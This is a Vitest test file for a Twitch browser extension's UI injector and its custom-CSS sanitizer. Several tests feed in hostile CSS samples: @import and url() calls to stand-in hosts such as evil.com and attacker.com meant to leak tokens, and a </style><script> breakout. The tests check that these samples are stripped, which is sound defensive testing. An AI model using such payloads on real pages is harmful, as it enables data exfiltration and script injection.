import { describe, it, expect, beforeEach } from 'vitest';
import { Window } from 'happy-dom';
import {
  findTwitchSearchTarget,
  createTriggerRootWrapper,
  insertTriggerRoot,
  applyCustomCss,
  sanitizeCustomCss,
} from './ui-injector';
import { NAV_SELECTORS } from './selectors';

describe('src/content/ui-injector.ts', () => {
  let domWindow: Window;
  let document: Document;

  beforeEach(() => {
    domWindow = new Window();
    document = domWindow.document as unknown as Document;
  });

  describe('findTwitchSearchTarget', () => {
    it('data-a-target="nav-search-box" の親要素を flex row に整形して返す', () => {
      const parent = document.createElement('div');
      const searchBox = document.createElement('div');
      searchBox.setAttribute('data-a-target', 'nav-search-box');
      parent.appendChild(searchBox);
      document.body.appendChild(parent);

      const result = findTwitchSearchTarget(document);
      expect(result).not.toBeNull();
      expect(result?.container).toBe(parent);
      expect(result?.searchBox).toBe(searchBox);
      expect(parent.style.display).toBe('flex');
      expect(parent.style.flexDirection).toBe('row');
    });

    it('検索ボックスが存在しない場合はトップナビのフォールバックを使用する', () => {
      const topNav = document.createElement('nav');
      topNav.setAttribute('data-a-target', 'top-nav');
      const centerDiv = document.createElement('div');
      centerDiv.className = 'tw-flex-grow-1 tw-align-items-center center-panel';
      topNav.appendChild(centerDiv);
      document.body.appendChild(topNav);

      const result = findTwitchSearchTarget(document);
      expect(result).not.toBeNull();
      expect(result?.container).toBe(centerDiv);
    });

    it('対象ナビゲーションが存在しない場合は null を返す', () => {
      expect(findTwitchSearchTarget(document)).toBeNull();
    });
  });

  describe('createTriggerRootWrapper & insertTriggerRoot', () => {
    it('トリガールート wrapper を正しく生成し、searchBox の直後に挿入する', () => {
      const container = document.createElement('div');
      const searchBox = document.createElement('div');
      const otherChild = document.createElement('div');
      container.appendChild(searchBox);
      container.appendChild(otherChild);
      document.body.appendChild(container);

      const wrapper = createTriggerRootWrapper(document);
      expect(wrapper.id).toBe(NAV_SELECTORS.TRIGGER_ROOT_ID);

      insertTriggerRoot({ container, searchBox }, wrapper);
      expect(searchBox.nextSibling).toBe(wrapper);
    });
  });

  describe('applyCustomCss', () => {
    it('有効なカスタムCSSが指定された場合、<head> に <style> 要素を生成・設定する', () => {
      const css = 'body { background: #000; }';
      const styleEl = applyCustomCss(css, true, null, document);

      expect(styleEl).not.toBeNull();
      expect(styleEl?.id).toBe('gnb-twipper-custom-css');
      expect(styleEl?.textContent).toBe(css);
      expect(document.getElementById('gnb-twipper-custom-css')).toBe(styleEl);
    });

    it('CSSが無効化された場合、style 要素の textContent を空にする', () => {
      const styleEl = document.createElement('style');
      styleEl.id = 'gnb-twipper-custom-css';
      styleEl.textContent = 'body { color: red; }';
      document.head.appendChild(styleEl);

      const updated = applyCustomCss('', false, styleEl, document);
      expect(updated?.textContent).toBe('');
    });

    it('危険な構文（@import, 外部url, </style>）が含まれる場合、サニタイズされて適用される', () => {
      const maliciousCss = `
        @import url("https://evil.com/leak.css");
        body { background: url('https://attacker.com/token?val=123'); color: white; }
        </style><script>alert(1)</script>
      `;
      const styleEl = applyCustomCss(maliciousCss, true, null, document);
      expect(styleEl).not.toBeNull();
      const content = styleEl?.textContent || '';
      expect(content).not.toContain('@import url("https://evil.com/leak.css")');
      expect(content).not.toContain('https://attacker.com/token');
      expect(content).not.toContain('</style>');
      expect(content).toContain('color: white');
    });
  });

  describe('sanitizeCustomCss', () => {
    it('安全な通常のCSSはそのまま通す', () => {
      const css = 'body { margin: 0; padding: 10px; color: #fff; }';
      const result = sanitizeCustomCss(css);
      expect(result.isValid).toBe(true);
      expect(result.safeCss).toBe(css);
      expect(result.warnings.length).toBe(0);
    });

    it('@import ルールを検出・遮断する', () => {
      const css = '@import "https://evil.com/style.css"; body { color: red; }';
      const result = sanitizeCustomCss(css);
      expect(result.isValid).toBe(false);
      expect(result.safeCss).not.toContain('@import');
      expect(result.warnings[0]).toContain('@import');
    });

    it('外部URL (http:, https:, //) への url() 参照を遮断する', () => {
      const css = 'div { background-image: url("http://evil.com/steal"); }';
      const result = sanitizeCustomCss(css);
      expect(result.isValid).toBe(false);
      expect(result.safeCss).not.toContain('http://evil.com');
      expect(result.warnings[0]).toContain('external url');
    });

    it('</style> タグ脱出シーケンスを安全に無害化する', () => {
      const css = 'a { color: blue; } </style><p>hacked</p>';
      const result = sanitizeCustomCss(css);
      expect(result.isValid).toBe(false);
      expect(result.safeCss).not.toContain('</style>');
      expect(result.safeCss).toContain('/* stripped style close tag */');
    });

    it('空文字列や空入力に対して安全に処理する', () => {
      expect(sanitizeCustomCss('')).toEqual({ safeCss: '', isValid: true, warnings: [] });
    });
  });
});
